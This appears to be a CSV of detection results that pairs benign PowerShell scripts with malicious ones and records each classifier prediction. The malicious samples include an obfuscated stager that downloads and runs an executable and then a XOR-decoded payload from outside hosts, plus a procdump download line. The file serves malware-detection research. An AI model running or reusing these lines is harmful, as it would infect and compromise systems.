filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,correct,predicted_label,logit_diff
1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,86,malicious,Invoke-WebRequest,True,malicious,0.15625
4058.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,654,654,False,"param(
    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
    [string]$parameters
)

$errorActionPreference = 'Stop'


echo ""download build core script to local with source url: $buildCorePowershellUrl""
$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
Invoke-WebRequest $buildCorePowershellUrl -OutFile ""$buildCorePowershellDestination""


echo ""run build core script with parameters: $parameters""
& ""$buildCorePowershellDestination"" ""$parameters""
exit $LASTEXITCODE",87,benign,Invoke-WebRequest,True,benign,-3.140625
1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,87,malicious,Invoke-WebRequest,True,malicious,0.15625
3104.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-Expression|Invoke-WebRequest,2,True,706,706,False,"param(
    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
    [string]$parameters
)

$errorActionPreference = 'Stop'


echo ""download build core script to local with source url: $buildCorePowershellUrl""
$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
Invoke-WebRequest $buildCorePowershellUrl -OutFile $buildCorePowershellDestination


echo ""run build core script with parameters: $parameters""
$arguments = ""-parameters:'$parameters'""
Invoke-Expression ""$buildCorePowershellDestination $arguments""
exit $LASTEXITCODE",88,benign,Invoke-WebRequest,True,benign,-2.578125
1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,88,malicious,Invoke-WebRequest,True,malicious,0.15625
896.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,839,839,False,"$Random=(New-Guid).ToString().Substring(0,8)


$ResourceGroupName=""myResourceGroup$Random""
$AppName=""AppServiceMonitor$Random""
$Location=""WestUS""


New-AzResourceGroup -Name $ResourceGroupName -Location $Location


New-AzAppservicePlan -Name AppServiceMonitorPlan -ResourceGroupName $ResourceGroupName -Location $Location -Tier Basic


New-AzWebApp -Name $AppName -ResourceGroupName $ResourceGroupName -Location $Location -AppServicePlan AppServiceMonitorPlan


Set-AzWebApp -RequestTracingEnabled $True -HttpLoggingEnabled $True -DetailedErrorLoggingEnabled $True -ResourceGroupName $ResourceGroupName -Name $AppName


Invoke-WebRequest -Method ""Get"" -Uri https://$AppName.azurewebsites.net/404 -ErrorAction SilentlyContinue


Write-Host ""In your browser, download the logs for your app at https://$AppName.scm.azurewebsites.net/api/dump""",89,benign,Invoke-WebRequest,True,benign,-3.25
1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,89,malicious,Invoke-WebRequest,True,malicious,0.15625
773.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,1845,1845,False,"param($buildVersion = $null)

$releasePath = [System.IO.Path]::GetFullPath(""$PSScriptRoot\..\release"")
$binariesToSignPath = [System.IO.Path]::GetFullPath(""$releasePath\BinariesToSign"")
$unpackedPackagesPath = [System.IO.Path]::GetFullPath(""$releasePath\UnpackedPackages"")


mkdir $releasePath -Force | Out-Null




if ($buildVersion -eq $null) {
    
    $headers = @{ ""Content-Type"" = ""application/json"" }
    $project = Invoke-RestMethod -Method Get -Uri ""https://ci.appveyor.com/api/projects/PowerShell/PowerShellEditorServices/branch/master"" -Headers $headers
    $buildVersion = $project.build.version
    if ($project.build.status -eq ""success"") {
        Write-Output ""Latest build version on master is $buildVersion`r`n""
    }
    else {
        Write-Error ""PowerShellEditorServices build $buildVersion was not successful!"" -ErrorAction ""Stop""
    }
}

function Install-BuildPackage($packageName, $extension) {
	$uri = ""https://ci.appveyor.com/nuget/powershelleditorservices/api/v2/package/{0}/{1}"" -f $packageName.ToLower(), $buildVersion
	Write-Verbose ""Fetching from URI: $uri""

	
	$zipPath = ""$releasePath\$packageName.zip""
	$packageContentPath = ""$unpackedPackagesPath\$packageName""
	Invoke-WebRequest $uri -OutFile $zipPath -ErrorAction ""Stop""
	Expand-Archive $zipPath -DestinationPath $packageContentPath -Force -ErrorAction ""Stop""
	Remove-Item $zipPath -ErrorAction ""Stop""

	
	mkdir $binariesToSignPath -Force | Out-Null
	cp ""$packageContentPath\lib\net45\$packageName.$extension"" -Force -Destination $binariesToSignPath

	Write-Output ""Extracted package $packageName ($buildVersion)""
}


Install-BuildPackage ""Microsoft.PowerShell.EditorServices"" ""dll""
Install-BuildPackage ""Microsoft.PowerShell.EditorServices.Protocol"" ""dll""
Install-BuildPackage ""Microsoft.PowerShell.EditorServices.Host"" ""dll""


& start $binariesToSignPath",91,benign,Invoke-WebRequest,True,benign,-3.734375
3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",91,malicious,Invoke-WebRequest,True,malicious,10.546875
2820.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,1851,1851,False,"function Send-GraphiteEvent
{

    [CmdletBinding()]
    param
    (
        [CmdletBinding()]
        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({ $_ -match '^(http|https)\:\/\/.*' })]
        [string]$GraphiteURL,

        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Topic"", ""Title"", ""Subject"")]
        [string]$What,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string]$Tags,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Body"")]
        [string]$Data
    )

    
    if (!($GraphiteURL.Substring($GraphiteURL.Length - 1) -eq '/'))
    {
        $GraphiteURL = $GraphiteURL + '/'
    }

    
    $GraphiteURL = $GraphiteURL + '/events/'

    
    $EventObject = New-Object PSObject -Property @{
        what = $What
    }

    
    if ($Tags)
    {
        Add-Member -NotePropertyName tags -NotePropertyValue $Tags -InputObject $EventObject
    }

    
    if ($Data)
    {
        Add-Member -NotePropertyName data -NotePropertyValue $Data -InputObject $EventObject
    }

    $EventObject = $EventObject | ConvertTo-Json

    Write-Verbose ""Json Object:""
    Write-Verbose $EventObject

    try
    {
        $result = Invoke-WebRequest -Uri $GraphiteURL -Body $EventObject -method Post -ContentType ""application/json""
        Write-Verbose ""Returned StatusCode: $($result.StatusCode)""
        Write-Verbose ""Returned StatusDescription: $($result.StatusDescription)""
    }

    catch
    {
        $exceptionText = GetPrettyProblem $_
        throw ""An error occurred trying to post data to Graphite. $exceptionText""
    }

}",92,benign,Invoke-WebRequest,True,benign,-2.578125
3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",92,malicious,Invoke-WebRequest,True,malicious,10.546875
773.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,1845,1845,False,"param($buildVersion = $null)

$releasePath = [System.IO.Path]::GetFullPath(""$PSScriptRoot\..\release"")
$binariesToSignPath = [System.IO.Path]::GetFullPath(""$releasePath\BinariesToSign"")
$unpackedPackagesPath = [System.IO.Path]::GetFullPath(""$releasePath\UnpackedPackages"")


mkdir $releasePath -Force | Out-Null




if ($buildVersion -eq $null) {
    
    $headers = @{ ""Content-Type"" = ""application/json"" }
    $project = Invoke-RestMethod -Method Get -Uri ""https://ci.appveyor.com/api/projects/PowerShell/PowerShellEditorServices/branch/master"" -Headers $headers
    $buildVersion = $project.build.version
    if ($project.build.status -eq ""success"") {
        Write-Output ""Latest build version on master is $buildVersion`r`n""
    }
    else {
        Write-Error ""PowerShellEditorServices build $buildVersion was not successful!"" -ErrorAction ""Stop""
    }
}

function Install-BuildPackage($packageName, $extension) {
	$uri = ""https://ci.appveyor.com/nuget/powershelleditorservices/api/v2/package/{0}/{1}"" -f $packageName.ToLower(), $buildVersion
	Write-Verbose ""Fetching from URI: $uri""

	
	$zipPath = ""$releasePath\$packageName.zip""
	$packageContentPath = ""$unpackedPackagesPath\$packageName""
	Invoke-WebRequest $uri -OutFile $zipPath -ErrorAction ""Stop""
	Expand-Archive $zipPath -DestinationPath $packageContentPath -Force -ErrorAction ""Stop""
	Remove-Item $zipPath -ErrorAction ""Stop""

	
	mkdir $binariesToSignPath -Force | Out-Null
	cp ""$packageContentPath\lib\net45\$packageName.$extension"" -Force -Destination $binariesToSignPath

	Write-Output ""Extracted package $packageName ($buildVersion)""
}


Install-BuildPackage ""Microsoft.PowerShell.EditorServices"" ""dll""
Install-BuildPackage ""Microsoft.PowerShell.EditorServices.Protocol"" ""dll""
Install-BuildPackage ""Microsoft.PowerShell.EditorServices.Host"" ""dll""


& start $binariesToSignPath",93,benign,Invoke-WebRequest,True,benign,-3.734375
1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,93,malicious,Invoke-WebRequest,True,malicious,0.15625
2820.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,1851,1851,False,"function Send-GraphiteEvent
{

    [CmdletBinding()]
    param
    (
        [CmdletBinding()]
        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({ $_ -match '^(http|https)\:\/\/.*' })]
        [string]$GraphiteURL,

        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Topic"", ""Title"", ""Subject"")]
        [string]$What,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string]$Tags,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Body"")]
        [string]$Data
    )

    
    if (!($GraphiteURL.Substring($GraphiteURL.Length - 1) -eq '/'))
    {
        $GraphiteURL = $GraphiteURL + '/'
    }

    
    $GraphiteURL = $GraphiteURL + '/events/'

    
    $EventObject = New-Object PSObject -Property @{
        what = $What
    }

    
    if ($Tags)
    {
        Add-Member -NotePropertyName tags -NotePropertyValue $Tags -InputObject $EventObject
    }

    
    if ($Data)
    {
        Add-Member -NotePropertyName data -NotePropertyValue $Data -InputObject $EventObject
    }

    $EventObject = $EventObject | ConvertTo-Json

    Write-Verbose ""Json Object:""
    Write-Verbose $EventObject

    try
    {
        $result = Invoke-WebRequest -Uri $GraphiteURL -Body $EventObject -method Post -ContentType ""application/json""
        Write-Verbose ""Returned StatusCode: $($result.StatusCode)""
        Write-Verbose ""Returned StatusDescription: $($result.StatusDescription)""
    }

    catch
    {
        $exceptionText = GetPrettyProblem $_
        throw ""An error occurred trying to post data to Graphite. $exceptionText""
    }

}",94,benign,Invoke-WebRequest,True,benign,-2.578125
1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,94,malicious,Invoke-WebRequest,True,malicious,0.15625
2969.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-Expression|Invoke-WebRequest,2,True,2339,2339,False,"function script:Start-NativeExecution([scriptblock]$sb, [switch]$IgnoreExitcode) {
    $backupEAP = $script:ErrorActionPreference
    $script:ErrorActionPreference = ""Continue""
    try {
        & $sb
        
        
        if ($LASTEXITCODE -ne 0 -and -not $IgnoreExitcode) {
            throw ""Execution of {$sb} failed with exit code $LASTEXITCODE""
        }
    }
    finally {
        $script:ErrorActionPreference = $backupEAP
    }
}

function Install-Dotnet {
    [CmdletBinding()]
    param(
        [string]$Channel = $dotnetCLIChannel,
        [string]$Version = $dotnetCLIRequiredVersion,
        [switch]$NoSudo
    )

    
    
    $sudo = if (!$NoSudo) { ""sudo"" }

    $obtainUrl = ""https://raw.githubusercontent.com/dotnet/cli/master/scripts/obtain""

    
    if ($IsLinux -or $IsMacOS) {
        
        $uninstallScript = if ($IsUbuntu) {
            ""dotnet-uninstall-debian-packages.sh""
        }
        elseif ($IsMacOS) {
            ""dotnet-uninstall-pkgs.sh""
        }

        if ($uninstallScript) {
            Start-NativeExecution {
                curl -sO $obtainUrl/uninstall/$uninstallScript
                Invoke-Expression ""$sudo bash ./$uninstallScript""
            }
        }
        else {
            Write-Warning ""This script only removes prior versions of dotnet for Ubuntu 14.04 and OS X""
        }

        
        $installScript = ""dotnet-install.sh""
        Start-NativeExecution {
            curl -sO $obtainUrl/$installScript
            bash ./$installScript -c $Channel -v $Version
        }
    }
    elseif (!(Test-Path Variable:\IsWindows) -or $IsWindows) {
        Remove-Item -ErrorAction SilentlyContinue -Recurse -Force ~\AppData\Local\Microsoft\dotnet
        $installScript = ""dotnet-install.ps1""
        Invoke-WebRequest -Uri $obtainUrl/$installScript -OutFile $installScript

        if (-not $IsCoreCLR) {
            & ./$installScript -Channel $Channel -Version $Version
        }
        else {
            
            $fullPSPath = Join-Path -Path $env:windir -ChildPath ""System32\WindowsPowerShell\v1.0\powershell.exe""
            $fullDotnetInstallPath = Join-Path -Path $pwd.Path -ChildPath $installScript
            Start-NativeExecution { & $fullPSPath -NoLogo -NoProfile -File $fullDotnetInstallPath -Channel $Channel -Version $Version }
        }
    }
}",95,benign,Invoke-WebRequest,True,benign,-1.140625
3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",95,malicious,Invoke-WebRequest,True,malicious,10.546875
712.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,4,True,2440,2440,False,"function Get-RsRestItemDataSource
{
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [Alias('ItemPath','Path')]
        [string]
        $RsItem,

        [string]
        $ReportPortalUri,

        [Alias('ApiVersion')]
        [ValidateSet(""v2.0"")]
        [string]
        $RestApiVersion = ""v2.0"",

        [Alias('ReportServerCredentials')]
        [System.Management.Automation.PSCredential]
        $Credential,

        [Microsoft.PowerShell.Commands.WebRequestSession]
        $WebSession
    )
    Begin
    {
        $WebSession = New-RsRestSessionHelper -BoundParameters $PSBoundParameters
        $ReportPortalUri = Get-RsPortalUriHelper -WebSession $WebSession
        $catalogItemsUri = $ReportPortalUri + ""api/$RestApiVersion/CatalogItems(Path='{0}')""
        $dataSourcesUri = $ReportPortalUri + ""api/$RestApiVersion/{0}(Path='{1}')?`$expand=DataSources""
    }
    Process
    {
        try
        {
            Write-Verbose ""Fetching metadata for $RsItem...""
            $catalogItemsUri = [String]::Format($catalogItemsUri, $RsItem)
            if ($Credential -ne $null)
            {
                $response = Invoke-WebRequest -Uri $catalogItemsUri -Method Get -WebSession $WebSession -Credential $Credential -Verbose:$false
            }
            else
            {
                $response = Invoke-WebRequest -Uri $catalogItemsUri -Method Get -WebSession $WebSession -UseDefaultCredentials -Verbose:$false
            }

            $item = ConvertFrom-Json $response.Content
            $itemType = $item.Type

            Write-Verbose ""Fetching data sources for $RsItem...""
            $dataSourcesUri = [String]::Format($dataSourcesUri, $itemType + ""s"", $RsItem)

            if ($Credential -ne $null)
            {
                $response = Invoke-WebRequest -Uri $dataSourcesUri -Method Get -WebSession $WebSession -Credential $Credential -Verbose:$false
            }
            else
            {
                $response = Invoke-WebRequest -Uri $dataSourcesUri -Method Get -WebSession $WebSession -UseDefaultCredentials -Verbose:$false
            }

            $itemWithDataSources = ConvertFrom-Json $response.Content
            return $itemWithDataSources.DataSources
        }
        catch
        {
            throw (New-Object System.Exception(""Failed to get data sources for '$RsItem': $($_.Exception.Message)"", $_.Exception))
        }
    }
}",96,benign,Invoke-WebRequest,True,benign,-2.1875
3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",96,malicious,Invoke-WebRequest,True,malicious,10.546875
2165.ps1,benign,natural_overlap,Invoke-WebRequest,DownloadFile|Invoke-WebRequest|Net.WebClient,4,True,2449,2449,False,"﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Specify the app name to search for within the App Store."")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern(""^[A-Za-z\s]*$"")]
    [string]$AppName,

    [parameter(Mandatory=$true, ParameterSetName=""Url"", HelpMessage=""Specify the URL pointing to the app in the App Store."")]
    [ValidateNotNullOrEmpty()]
    [string]$URL,

    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Path to a folder where the app image will be downloaded to."")]
    [parameter(Mandatory=$true, ParameterSetName=""Url"")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern(""^[A-Za-z]{1}:\\\w+"")]
    [ValidateScript({
	    
	    if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
		    Throw ""$(Split-Path -Path $_ -Leaf) contains invalid characters""
	    }
	    else {
		    
		    if (Test-Path -Path $_ -PathType Container) {
				    return $true
		    }
		    else {
			    Throw ""Unable to locate part of or the whole specified path, specify a valid path""
		    }
	    }
    })]
    [string]$Path
)
Process {
    
    $StoreAppName = ($AppName -replace "" "", ""+"").ToLower()

    switch ($PSCmdlet.ParameterSetName) {
        ""AppName"" {
            
            $SearchURL = ""https://itunes.apple.com/search?term=$($StoreAppName)&entity=software&limit=1""
            $SearchWebRequest = Invoke-WebRequest -Uri $SearchURL
            $AppLink = (ConvertFrom-Json -InputObject $SearchWebRequest).Results | Select-Object -ExpandProperty trackViewUrl
        }
        ""Url"" {
            $AppLink = $URL
        }
    }

    
    if ($AppLink -ne $null) {
        $WebRequest = Invoke-WebRequest -Uri $AppLink
        $AppIcon = $WebRequest.Images | Where-Object { ($_.Width -eq 175) -and ($_.Class -like ""artwork"") }
        if ($AppIcon -ne $null) {
            
            $WebClient = New-Object System.Net.WebClient
            $WebClient.DownloadFile($AppIcon.""src-swap"", ""$($Path)\$($AppIcon.alt).jpg"")
            $AppImage = [PSCustomObject]@{
                ImageName = $AppIcon.alt
                ImagePath = ""$($Path)\$($AppIcon.alt).jpg""
            }
            Write-Output -InputObject $AppImage
        }
    }
    else {
        Write-Warning -Message ""Unable to determine app link for specified app: $($AppName)""
    }
}
End {
    
    $WebClient.Dispose()
}",97,benign,Invoke-WebRequest,True,benign,-1.65625
3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",97,malicious,Invoke-WebRequest,True,malicious,10.546875
2969.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-Expression|Invoke-WebRequest,2,True,2339,2339,False,"function script:Start-NativeExecution([scriptblock]$sb, [switch]$IgnoreExitcode) {
    $backupEAP = $script:ErrorActionPreference
    $script:ErrorActionPreference = ""Continue""
    try {
        & $sb
        
        
        if ($LASTEXITCODE -ne 0 -and -not $IgnoreExitcode) {
            throw ""Execution of {$sb} failed with exit code $LASTEXITCODE""
        }
    }
    finally {
        $script:ErrorActionPreference = $backupEAP
    }
}

function Install-Dotnet {
    [CmdletBinding()]
    param(
        [string]$Channel = $dotnetCLIChannel,
        [string]$Version = $dotnetCLIRequiredVersion,
        [switch]$NoSudo
    )

    
    
    $sudo = if (!$NoSudo) { ""sudo"" }

    $obtainUrl = ""https://raw.githubusercontent.com/dotnet/cli/master/scripts/obtain""

    
    if ($IsLinux -or $IsMacOS) {
        
        $uninstallScript = if ($IsUbuntu) {
            ""dotnet-uninstall-debian-packages.sh""
        }
        elseif ($IsMacOS) {
            ""dotnet-uninstall-pkgs.sh""
        }

        if ($uninstallScript) {
            Start-NativeExecution {
                curl -sO $obtainUrl/uninstall/$uninstallScript
                Invoke-Expression ""$sudo bash ./$uninstallScript""
            }
        }
        else {
            Write-Warning ""This script only removes prior versions of dotnet for Ubuntu 14.04 and OS X""
        }

        
        $installScript = ""dotnet-install.sh""
        Start-NativeExecution {
            curl -sO $obtainUrl/$installScript
            bash ./$installScript -c $Channel -v $Version
        }
    }
    elseif (!(Test-Path Variable:\IsWindows) -or $IsWindows) {
        Remove-Item -ErrorAction SilentlyContinue -Recurse -Force ~\AppData\Local\Microsoft\dotnet
        $installScript = ""dotnet-install.ps1""
        Invoke-WebRequest -Uri $obtainUrl/$installScript -OutFile $installScript

        if (-not $IsCoreCLR) {
            & ./$installScript -Channel $Channel -Version $Version
        }
        else {
            
            $fullPSPath = Join-Path -Path $env:windir -ChildPath ""System32\WindowsPowerShell\v1.0\powershell.exe""
            $fullDotnetInstallPath = Join-Path -Path $pwd.Path -ChildPath $installScript
            Start-NativeExecution { & $fullPSPath -NoLogo -NoProfile -File $fullDotnetInstallPath -Channel $Channel -Version $Version }
        }
    }
}",98,benign,Invoke-WebRequest,True,benign,-1.140625
1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,98,malicious,Invoke-WebRequest,True,malicious,0.15625
